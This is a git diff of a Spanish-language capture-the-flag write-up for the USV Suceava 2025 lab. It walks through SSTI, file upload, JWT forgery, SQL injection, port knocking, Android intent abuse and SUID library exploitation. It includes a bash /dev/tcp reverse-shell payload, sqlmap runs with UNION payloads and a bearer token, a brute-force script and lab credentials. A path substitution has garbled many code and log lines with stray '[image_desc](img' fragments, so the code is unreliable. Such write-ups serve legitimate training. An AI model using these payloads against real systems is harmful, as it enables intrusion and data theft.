@@ -1,4 +1,4 @@
-![image_desc](USV_CTF_2025/img/CTF_USV_2025.jpg)
+![image_desc](img/CTF_USV_2025.jpg)
 
 # CTF USV Suceava 2025 (ONIUCI Writeup)
 #### Por Calana2 (a.k.a `s1s1fo`)
@@ -29,37 +29,37 @@ Este CTF emula una infraestructura con temática de la serie "Squid Game".
 ---
 ## Flag 1 -- Server Side Template Injection (SSTi) 
 
-![image_desc](USV_CTF_2025/img/2025-11-27-194551_1351x588_scrot 1.png)
+![image_desc](img/2025-11-27-194551_1351x588_scrot 1.png)
 
 Después de jugar "luz-roja luz verde" en el sitio web expuesto en el puerto 8080 nos dan una pista:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-194801_1348x600_scrot.png)
+![image_desc](img/2025-11-27-194801_1348x600_scrot.png)
 
 Esto sugiere STTI en uno de los campos del formulario que actualiza la información del jugador. PoC: `{{ 2+2 }}`
 Sabemos que usa PHP asi que probamos con una carga útil para garantizarnos una reverse shell en <INSERTAR STTI\>:  `{{ system("/bin/bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1)" }}`
 
-![image_desc](USV_CTF_2025/img/2025-11-27-194840_1346x477_scrot.png)
+![image_desc](img/2025-11-27-194840_1346x477_scrot.png)
 
 Una vez dentro revisamos el contenido de `/var/www/html/config.php` para obtener las credenciales de la base de datos y encontramos la primera bandera:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195029_760x577_scrot.png)
+![image_desc](img/2025-11-27-195029_760x577_scrot.png)
 
 
 ## Flag 2 -- Subida de archivos insegura
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195117_1341x397_scrot.png)
+![image_desc](img/2025-11-27-195117_1341x397_scrot.png)
 
 A pesar del mensaje  "Forbidden" devuelto en la raíz del sitio web expuesto en el puerto 8081 la ruta `/login.php` es accesible. Podemos iniciar sesión en la base de datos MySQL expuesta en el puerto 3306 con las credenciales encontradas en el primer reto y volcar la tabla `admin users`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195241_977x599_scrot.png)
+![image_desc](img/2025-11-27-195241_977x599_scrot.png)
 
 Las credenciales `front_man:red_light_green_light_456` son válidas para `/login.php`. Al iniciar sesión nos redirige a `/upload.php`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195319_1342x588_scrot.png)
+![image_desc](img/2025-11-27-195319_1342x588_scrot.png)
 
 Solo se permiten archivos con formato GIF, PNG, JPEG, PDF, etc. Sin embargo la lógica del programa solo valida la extensión. Podemos subir un archivo php malicioso que contenga una reverse shell bajo el nombre `file.png.php`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195412_1346x590_scrot.png)
+![image_desc](img/2025-11-27-195412_1346x590_scrot.png)
 
 Nos dan una pista de bajo que nombre se guarda el archivo en el servidor. Creamos un script para encontrar por fuerza bruta el posible archivo. Asumimos que la ruta es `/uploads/<file>` como ocurre usualmente:
 
@@ -79,18 +79,18 @@ def check_filename(player, game_round, retries=3):
         try:
             response = requests.get(url, timeout=3, cookies=c)
             if response.status_code == 200:
-                print(f"[image_desc](USV_CTF_2025/img] Encontrado: {url}")
+                print(f"[image_desc](img] Encontrado: {url}")
                 exit(0)
             else:
-                return f"[image_desc](USV_CTF_2025/img] {url} -> {response.status_code}"
+                return f"[image_desc](img] {url} -> {response.status_code}"
         except requests.exceptions.RequestException as e:
             if attempt < retries:
-                print(f"[image_desc](USV_CTF_2025/img] Error con {url}, reintentando ({attempt}/{retries})...")
+                print(f"[image_desc](img] Error con {url}, reintentando ({attempt}/{retries})...")
             else:
-                return f"[image_desc](USV_CTF_2025/img] Error persistente con {url}: {e}"
+                return f"[image_desc](img] Error persistente con {url}: {e}"
 
 def main():
-    tasks = [image_desc](USV_CTF_2025/img
+    tasks = [image_desc](img
     with ThreadPoolExecutor(max_workers=10) as executor:  # 10 hilos
         for player in range(1, 457):  # 001 a 456
             for game_round in range(1, 7):  # 1 a 6
@@ -103,28 +103,28 @@ if __name__ == "__main__":
     main()
 ```
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205151_1337x530_scrot 1.png)
+![image_desc](img/2025-11-27-205151_1337x530_scrot 1.png)
 
 En `var/www/html/prize-only-for-the-worthy-62t1etlet7/prize.txt` encontramos la segunda flag y unas credenciales:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205350_772x335_scrot.png)
+![image_desc](img/2025-11-27-205350_772x335_scrot.png)
 
 ## Flag 3 -- Less Significative Bit (LSB) Steganography + Falsificación de JSON Web Tokens (JWT)
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205445_1348x586_scrot.png)
+![image_desc](img/2025-11-27-205445_1348x586_scrot.png)
 
 En el sitio web expuesto en el puerto 8082 encontramos un `/robots.txt`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205459_1346x630_scrot.png)
+![image_desc](img/2025-11-27-205459_1346x630_scrot.png)
 
 Ambas rutas nos redirigen a `/login`. Con las credenciales encontradas en el reto anterior podemos iniciar sesión:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205520_1345x618_scrot.png)
+![image_desc](img/2025-11-27-205520_1345x618_scrot.png)
 
 Tenemos acceso a `/status` pero no a `/organs`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205614_1341x630_scrot.png)
-![image_desc](USV_CTF_2025/img/2025-11-27-205634_1347x632_scrot.png)
+![image_desc](img/2025-11-27-205614_1341x630_scrot.png)
+![image_desc](img/2025-11-27-205634_1347x632_scrot.png)
 
 Si vemos las peticiones que se hacen al sitio con `curl` nos damos cuenta de que usa `React` o algun framework de Javascript como front-end. `React` renderiza completamente el sitio desde el Javascript. Si descargamos el archivo `main.js` tenemos acceso al código fuente del cliente. Si filtramos por los comentarios en HTML encontramos una pista:
 
@@ -144,7 +144,7 @@ b1,rgb,lsb,xy       .. text: "55:worker secret:dead_people_remember_more_than_al
 b1,bgr,lsb,xy       .. file: OpenPGP Secret Key
 b2,b,msb,xy         .. file: OpenPGP Public Key
 b4,r,lsb,xy         .. text: "uB$2#4Cgxw"
-b4,r,msb,xy         .. text: [image_desc](USV_CTF_2025/img3" repeated 19 times]
+b4,r,msb,xy         .. text: [image_desc](img3" repeated 19 times]
 b4,g,lsb,xy         .. text: "3R5Wwxud"
 b4,b,lsb,xy         .. text: "22\"3U2\"#3UD!"
 ```
@@ -153,21 +153,21 @@ De `main.js` podemos observar que la aplicación usa JWT para autenticación. Co
 
 Revisamos el JWT que tenemos:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-213410_1366x768_scrot 1.png)
+![image_desc](img/2025-11-27-213410_1366x768_scrot 1.png)
 
 Modificamos el campo `role` para convertirnos en un trabajador y firmamos el JWT con el secreto encontrado:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-213311_1366x768_scrot.png)
+![image_desc](img/2025-11-27-213311_1366x768_scrot.png)
 
 Ahora podemos acceder a `/organs` para obtener la tercera flag:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-213420_1366x768_scrot 1.png)
+![image_desc](img/2025-11-27-213420_1366x768_scrot 1.png)
 
 ## Flag 4 -- Structured Query Language Injection (SQLi)
 
 El campo de la barra de búsqueda (name) es inyectable:
 
-![image_desc](USV_CTF_2025/img/2025-11-28-193220_672x336_scrot.png)
+![image_desc](img/2025-11-28-193220_672x336_scrot.png)
 
 Con `sqlmap` podemos ver la base de datos `organsdb`:
 
@@ -175,14 +175,14 @@ Con `sqlmap` podemos ver la base de datos `organsdb`:
 sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" --dbs -v 0  
         ___
        __H__
- ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
-|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
+ ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
+|_ -| . [image_desc](img]     | .'| . |
+|___|_  [image_desc](img]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](USV_CTF_2025/img] starting @ 21:42:11 /2025-11-27/
+[image_desc](img] starting @ 21:42:11 /2025-11-27/
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -201,15 +201,15 @@ Parameter: name (GET)
 ---
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
-available databases [image_desc](USV_CTF_2025/img]:
-[image_desc](USV_CTF_2025/img] information_schema
-[image_desc](USV_CTF_2025/img] mysql
-[image_desc](USV_CTF_2025/img] organsdb
-[image_desc](USV_CTF_2025/img] performance_schema
-[image_desc](USV_CTF_2025/img] sys
+available databases [image_desc](img]:
+[image_desc](img] information_schema
+[image_desc](img] mysql
+[image_desc](img] organsdb
+[image_desc](img] performance_schema
+[image_desc](img] sys
 
 
-[image_desc](USV_CTF_2025/img] ending @ 21:42:13 /2025-11-27/
+[image_desc](img] ending @ 21:42:13 /2025-11-27/
 
 ```
 
@@ -220,14 +220,14 @@ $ sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authoriza
 --tables -v 0
         ___
        __H__
- ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
-|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
+ ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
+|_ -| . [image_desc](img]     | .'| . |
+|___|_  [image_desc](img]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](USV_CTF_2025/img] starting @ 21:42:57 /2025-11-27/
+[image_desc](img] starting @ 21:42:57 /2025-11-27/
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -247,7 +247,7 @@ Parameter: name (GET)
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
 Database: organsdb
-[image_desc](USV_CTF_2025/img tables]
+[image_desc](img tables]
 +----------+
 | messages |
 | organs   |
@@ -255,7 +255,7 @@ Database: organsdb
 +----------+
 
 
-[image_desc](USV_CTF_2025/img] ending @ 21:42:59 /2025-11-27/
+[image_desc](img] ending @ 21:42:59 /2025-11-27/
 ```
 
 Luego con `sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages --columns` identificamos las columnas `hint` y `flag`. Volcamos la quinta flag:
@@ -264,17 +264,17 @@ Luego con `sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="
  sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages -C flag --dump
         ___
        __H__
- ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
-|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
+ ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
+|_ -| . [image_desc](img]     | .'| . |
+|___|_  [image_desc](img]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](USV_CTF_2025/img] starting @ 21:46:39 /2025-11-27/
+[image_desc](img] starting @ 21:46:39 /2025-11-27/
 
-[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] resuming back-end DBMS 'mysql'
-[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] testing connection to the target URL
+[image_desc](img1:46:39] [image_desc](imgNFO] resuming back-end DBMS 'mysql'
+[image_desc](img1:46:39] [image_desc](imgNFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: name (GET)
@@ -290,26 +290,26 @@ Parameter: name (GET)
     Title: Generic UNION query (NULL) - 3 columns
     Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
 ---
-[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] the back-end DBMS is MySQL
+[image_desc](img1:46:41] [image_desc](imgNFO] the back-end DBMS is MySQL
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
-[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
+[image_desc](img1:46:41] [image_desc](imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
 Database: organsdb
 Table: messages
-[image_desc](USV_CTF_2025/img entry]
+[image_desc](img entry]
 +----------------------------------------+
 | flag                                   |
 +----------------------------------------+
 | flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3} |
 +----------------------------------------+
 
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] HTTP error codes detected during run:
+[image_desc](img1:46:44] [image_desc](imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
+[image_desc](img1:46:44] [image_desc](imgARNING] HTTP error codes detected during run:
 400 (Bad Request) - 2 times
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] your sqlmap version is outdated
+[image_desc](img1:46:44] [image_desc](imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
+[image_desc](img1:46:44] [image_desc](imgARNING] your sqlmap version is outdated
 
-[image_desc](USV_CTF_2025/img] ending @ 21:46:44 /2025-11-27/
+[image_desc](img] ending @ 21:46:44 /2025-11-27/
 ```
 
 ## Flag 5 -- Port knocking
@@ -319,17 +319,17 @@ Volcamos la columna `hint` de la tabla `messages`:
  sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages -C flag --dump
         ___
        __H__
- ___ ___[image_desc](USV_CTF_2025/img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](USV_CTF_2025/img]     | .'| . |
-|___|_  [image_desc](USV_CTF_2025/img]_|_|_|__,|  _|
+ ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
+|_ -| . [image_desc](img]     | .'| . |
+|___|_  [image_desc](img]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](USV_CTF_2025/img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](USV_CTF_2025/img] starting @ 21:46:39 /2025-11-27/
+[image_desc](img] starting @ 21:46:39 /2025-11-27/
 
-[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] resuming back-end DBMS 'mysql'
-[image_desc](USV_CTF_2025/img1:46:39] [image_desc](USV_CTF_2025/imgNFO] testing connection to the target URL
+[image_desc](img1:46:39] [image_desc](imgNFO] resuming back-end DBMS 'mysql'
+[image_desc](img1:46:39] [image_desc](imgNFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: name (GET)
@@ -345,32 +345,32 @@ Parameter: name (GET)
     Title: Generic UNION query (NULL) - 3 columns
     Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
 ---
-[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] the back-end DBMS is MySQL
+[image_desc](img1:46:41] [image_desc](imgNFO] the back-end DBMS is MySQL
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
-[image_desc](USV_CTF_2025/img1:46:41] [image_desc](USV_CTF_2025/imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
+[image_desc](img1:46:41] [image_desc](imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
 Database: organsdb
 Table: messages
-[image_desc](USV_CTF_2025/img entry]
+[image_desc](img entry]
 +----------------------------------------+
 | flag                                   |
 +----------------------------------------+
 | flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3} |
 +----------------------------------------+
 
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] HTTP error codes detected during run:
+[image_desc](img1:46:44] [image_desc](imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
+[image_desc](img1:46:44] [image_desc](imgARNING] HTTP error codes detected during run:
 400 (Bad Request) - 2 times
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
-[image_desc](USV_CTF_2025/img1:46:44] [image_desc](USV_CTF_2025/imgARNING] your sqlmap version is outdated
+[image_desc](img1:46:44] [image_desc](imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
+[image_desc](img1:46:44] [image_desc](imgARNING] your sqlmap version is outdated
 
-[image_desc](USV_CTF_2025/img] ending @ 21:46:44 /2025-11-27/
+[image_desc](img] ending @ 21:46:44 /2025-11-27/
 ```
 
 Este contiene un mensaje enorme codificado en base64. Lo decodificamos:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-215159_937x151_scrot.png)
-![image_desc](USV_CTF_2025/img/2025-11-27-215142_640x254_scrot.png)
+![image_desc](img/2025-11-27-215159_937x151_scrot.png)
+![image_desc](img/2025-11-27-215142_640x254_scrot.png)
 
 Es una imagen jpeg al parecer. Eliminamos los primeros tres bytes para convertirlo en una imagen válida:
 
@@ -382,20 +382,20 @@ dd if=hint of=hint.jpg ibs=1 skip=3;file hint.jpg
 hint.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 1024x1536, components 3
 ```
 
-![image_desc](USV_CTF_2025/img/image.jpg)
+![image_desc](img/image.jpg)
 
 
 La pista hace referencia al *port knocking*, un método para abrir puertos externamente generando intentos de conexión a un conjunto de puertos cerrados en un orden específico. Enviamos un paquete TCP SYN a los puertos 456, 218 y 67 respectivamente. Mágicamente el servidor SMTP en el puerto 25 ahora acepta conexiones. Ejecutamos el comando MESSAGE y obtenemos la quinta flag:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-215327_1151x608_scrot.png)
+![image_desc](img/2025-11-27-215327_1151x608_scrot.png)
 
 ## Flag 6 -- Intent Explotation
 
 Si probamos el comando *HISTORY* nos informa de la URL para descargar una APK. Hacemos port knocking nuevamente y descargamos el archivo:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-215504_1190x623_scrot.png)
+![image_desc](img/2025-11-27-215504_1190x623_scrot.png)
 
-![image_desc](USV_CTF_2025/img/2025-11-27-220403_1300x480_scrot.png)
+![image_desc](img/2025-11-27-220403_1300x480_scrot.png)
 
 Extraemos la APK con `apktools`:
 ```
@@ -418,7 +418,7 @@ I: Copying META-INF/services director
 Instalamos la APK y especificamos como host nuestra máquina vulnerable. 
 La aplicación cuenta con un menú de desarrollador al cual no tenemos acceso:
 
-![image_desc](USV_CTF_2025/img/Screenshot_20251129-095545_VIPs.jpg)
+![image_desc](img/Screenshot_20251129-095545_VIPs.jpg)
 
 ```
 grep -iRnE "secret"
@@ -444,7 +444,7 @@ VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:519:    iput-object
 Analizamos `DevMenuActivity.smali` por su actividad sospechosa. Pasamos el código smali a un decompilador y encontramos lo siguiente:
 ```java
     public final String getRequiredSecret() {
-        byte[image_desc](USV_CTF_2025/img decode = Base64.decode("c2ViYWdfem5hX2ZycGVyZ19ucHByZmZfeHJs", 2);
+        byte[image_desc](img decode = Base64.decode("c2ViYWdfem5hX2ZycGVyZ19ucHByZmZfeHJs", 2);
         Intrinsics.checkNotNull(decode);
         Charset charset = StandardCharsets.UTF_8;
         Intrinsics.checkNotNullExpressionValue(charset, "UTF_8");
@@ -484,18 +484,18 @@ adb shell am start -n com.squidgame.vips/.DevMenuActivity \
   --es decrypted_secret "front_man_secret_access_key"
 ```
 
-![image_desc](USV_CTF_2025/img/Screenshot_20251129-095232_VIPs.jpg)
+![image_desc](img/Screenshot_20251129-095232_VIPs.jpg)
 
 Al pulsar el botón *Check Vips* podemos obtener usuarios y contraseñas, incluyendo la sexta flag:
 
-![image_desc](USV_CTF_2025/img/photo_2025-11-28_22-06-24.jpg)
+![image_desc](img/photo_2025-11-28_22-06-24.jpg)
 ## Flag 7 -- Cronjob inseguro + SUID Shared Library Injection
 
 Con las credenciales `jack:UsbNQ3%dca98#SqD` podemos conectarnos vía SSH al servidor.
 
 En `/etc/cronjob` encontramos una tarea programada que ejecuta `/bin/update-lib.sh` cada 2 minutos. Buscando por binarios SUID encontramos un binario con SUID root `/usr/bin/squid`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-220717_1366x768_scrot.png)
+![image_desc](img/2025-11-27-220717_1366x768_scrot.png)
 
 Identificamos que está empaquetado con UPX usando `strings squid | grep UPX` y lo desempaquetamos con `upx -d squid`
 
@@ -515,19 +515,19 @@ Analizando el binario con permisos SUID en Ghidra vemos que contiene la cadena "
 ```C
     iVar1 = strcmp(_plaintext_pass,input);
     if (iVar1 == 0) {
-      _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b10;
+      _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b10;
       lVar2 = dlopen(&lib_name,1);
       local_68 = lVar2;
       if (lVar2 == 0) {
-        _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b3e;
+        _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b3e;
         fwrite("Failed to load lib:",1,0x13,stderr);
       }
       else {
-        _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b5b;
+        _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b5b;
         run_helper_address = (code *)dlsym(lVar2,&local _f8);
         local_70 = run_helper_address;
         if (run_helper_address != (code *)0x0) {
-          _argv[image_desc](USV_CTF_2025/imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b9b;
+          _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b9b;
           (*run_helper_address)();
           return 0;
         }
@@ -581,7 +581,7 @@ void transform(char *expected_str,long addr)
   blocks = ((long)__len_expected_int + 15U) / 16;
   local_40 = (undefined *)(&__param2 + blocks * -2);
   for (i = 0; i < __len_expected_int; i = i + 1) {
-    *(char *)((long)&__param2 + (long)i + blocks * -0x1 0) = _expected_str[image_desc](USV_CTF_2025/img];
+    *(char *)((long)&__param2 + (long)i + blocks * -0x1 0) = _expected_str[image_desc](img];
   }
   local_48 = (long)__len_expected_int + -1;
   num_16_byte_blocks = ((long)__len_expected_int + 0xf U) / 0x10;
@@ -590,29 +590,29 @@ void transform(char *expected_str,long addr)
   num_16_bytes_block_ = ((long)__len_expected_int + 0 xfU) / 0x10;
   local_60 = (undefined *)
              (&__param2 + blocks * -2 + num_16_byte_block s * -2 + num_16_bytes_block_ * -2);
-  (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101522;
+  (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101522;
   fun1(__expected_str,&__param2 + blocks * -2 + num_ 16_byte_blocks * -2,len_expected & 0xffffffff);
   another_len = __len_expected_int;
   addr_ = some_address;
-  (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101533;
+  (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101533;
   fun2(addr_,another_len);
   another_len = __len_expected_int;
   addr_ = some_address;
-  (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101544;
+  (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101544;
   another_len = fun3(addr_,another_len);
   if (another_len != 42) {
     for (local_20 = 0; local_20 < 44; local_20 = local_20 + 1) {
       for (k = 0; k < __len_expected_int; k = k + 1) {
-        uVar1 = local_40[image_desc](USV_CTF_2025/img];
+        uVar1 = local_40[image_desc](img];
         another_len = k % 8;
         local_61 = uVar1;
-        (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
+        (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
         bVar2 = fun4(uVar1,another_len);
-        local_40[image_desc](USV_CTF_2025/img] = bVar2 ^ 0x4f;
+        local_40[image_desc](img] = bVar2 ^ 0x4f;
       }
     }
     for (j = 0; j < __len_expected_int; j = j + 1) {
-      *(undefined *)(__param2 + j) = local_40[image_desc](USV_CTF_2025/img];
+      *(undefined *)(__param2 + j) = local_40[image_desc](img];
     }
   }
   return;
@@ -674,16 +674,16 @@ Hay varios puntos a tener en cuenta:
   if (_var != 42) {
     for (local_20 = 0; local_20 < 44; local_20 = local_20 + 1) {
       for (k = 0; k < __len_expected_int; k = k + 1) {
-        uVar1 = local_40[image_desc](USV_CTF_2025/img];
+        uVar1 = local_40[image_desc](img];
         _var = k % 8;
         local_61 = uVar1;
-        (&uStack_80)[image_desc](USV_CTF_2025/imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
+        (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
         bVar2 = fun4(uVar1,_var);
-        local_40[image_desc](USV_CTF_2025/img] = bVar2 ^ 0x4f;
+        local_40[image_desc](img] = bVar2 ^ 0x4f;
       }
     }
     for (j = 0; j < __len_expected_int; j = j + 1) {
-      *(undefined *)(__param2 + j) = local_40[image_desc](USV_CTF_2025/img];
